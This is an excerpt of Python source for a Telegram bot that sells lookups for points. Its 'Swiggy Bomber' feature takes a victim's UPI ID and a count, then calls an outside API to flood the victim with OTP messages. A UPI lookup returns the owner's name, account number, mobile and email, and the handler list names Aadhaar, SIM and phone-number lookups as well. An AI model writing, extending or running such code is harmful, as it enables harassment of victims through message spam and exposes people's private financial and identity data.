...
async def show_main_menu(query, user_id=None):
    ...
    keyboard = [
        ...
        [InlineKeyboardButton("💳 UPI Info", callback_data="upi_info"),
         InlineKeyboardButton("🏦 IFSC Info", callback_data="ifsc_info")],
        [InlineKeyboardButton("💣 Swiggy Bomber", callback_data="swiggy_bomber")],
...
async def handle_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    prompts = {
        ...
        "upi_info":     ("💳 Send UPI ID:\nExample: pwneetanurag@fam", "upi_info"),
        "ifsc_info":    ("🏦 Send IFSC code:\nExample: SBIN0004843", "ifsc_info"),
        "swiggy_bomber":("💣 Send UPI ID to bomb (OTP spam):\nExample: pwneetanurag@fam\n\n⚠️ Use responsibly!", "swiggy_bomber"),
    }
    ...
    if query.data == "swiggy_bomber":
        text, key = prompts["swiggy_bomber"]
        await query.edit_message_text(text, reply_markup=back_markup)
        context.user_data["waiting_for"] = key
...
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    ...
    elif waiting_for == "upi_info":
        data = await fetch_api(f"https://upii-info.vercel.app/api?key=DEMO456&type=upi&term={user_input}")
        result = format_upi_info(user_input, data) if data else f"❌ Data Not Available for UPI: {user_input}"
    elif waiting_for == "ifsc_info":
        data = await fetch_api(f"https://ifsc.razorpay.com/{user_input.upper()}")
        result = format_ifsc_info(user_input, data) if data else f"❌ Invalid IFSC Code: {user_input}"
    elif waiting_for == "swiggy_bomber":
        # Step 1: get UPI, Step 2: get count
        if context.user_data.get("bomber_count") is None:
            # First input = UPI ID
            context.user_data["bomber_upi"] = user_input
            context.user_data["bomber_count"] = "waiting"
            await processing_msg.delete()
            await update.message.reply_text(
                f"✅ UPI: {user_input}\n\n💣 Ab count bhejo (1-20):\nExample: 5",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]]))
            return
        elif context.user_data.get("bomber_count") == "waiting":
            # Second input = count
            try:
                count = min(int(user_input), 20)
            except:
                count = 5
            upi = context.user_data.get("bomber_upi", "")
            context.user_data["bomber_count"] = None
            context.user_data["bomber_upi"] = None
            context.user_data["waiting_for"] = None
            import urllib.parse
            url = f"https://swiggy-bomber.sanadress877.workers.dev/api?upi={urllib.parse.quote(upi)}&count={count}"
            data = await fetch_api(url)
            if data:
                result = f"💣 Swiggy Bomber\n━━━━━━━━━━━━━━━━━━\n▫️ UPI: {upi}\n▫️ Count: {count}\n▫️ Status: {data.get('message', data.get('status', 'Sent!'))}\n━━━━━━━━━━━━━━━━━━\n▫️ Owner: @GODCHEATOFFICIAL"
            else:
                result = f"❌ Bomber failed for: {upi}"
...
def format_upi_info(upi, data):
    result = f"💳 UPI Info for: {upi}\n━━━━━━━━━━━━━━━━━━"
    if not data or not isinstance(data, dict):
        return result + "\n▫️ NO DATA FOUND\n\n▫️ Owner: @GODCHEATOFFICIAL"
    # Handle different response formats
    info = data.get("data") or data.get("result") or data
    if isinstance(info, list) and len(info) > 0:
        info = info[0]
    if isinstance(info, dict):
        for key, label in [("name","Name"),("vpa","UPI ID"),("bank","Bank"),("ifsc","IFSC"),
                            ("account","Account"),("mobile","Mobile"),("email","Email"),("status","Status")]:
            val = info.get(key) or info.get(key.upper())
            if val and str(val).strip() not in ("","None","null","N/A"):
                result += f"\n▫️ {label}: {val}"
    else:
        result += f"\n▫️ Response: {str(data)[:200]}"
    result += "\n━━━━━━━━━━━━━━━━━━\n▫️ Owner: @GODCHEATOFFICIAL"
    return result

def format_ifsc_info(ifsc, data):
    result = f"🏦 IFSC Info for: {ifsc.upper()}\n━━━━━━━━━━━━━━━━━━"
    if not data or not isinstance(data, dict):
        return result + "\n▫️ NO DATA FOUND\n\n▫️ Owner: @GODCHEATOFFICIAL"
    for key, label in [("BANK","Bank Name"),("BRANCH","Branch"),("ADDRESS","Address"),
                        ("CITY","City"),("DISTRICT","District"),("STATE","State"),
                        ("CONTACT","Contact"),("IFSC","IFSC"),("MICR","MICR"),
                        ("RTGS","RTGS"),("NEFT","NEFT"),("IMPS","IMPS")]:
        val = data.get(key)
        if val and str(val).strip() not in ("","None","null","false","False"):
            result += f"\n▫️ {label}: {val}"
    result += "\n━━━━━━━━━━━━━━━━━━\n▫️ Owner: @GODCHEATOFFICIAL"
    return result
...
def main():
    ...
    app.add_handler(CallbackQueryHandler(handle_menu, pattern="^(number_info|vehicle_info|pincode_info|tg_userid|aadhaar_info|sim_info|github_info|gst_info|num_name|upi_info|ifsc_info|swiggy_bomber|refer_menu|buy_points)$"))
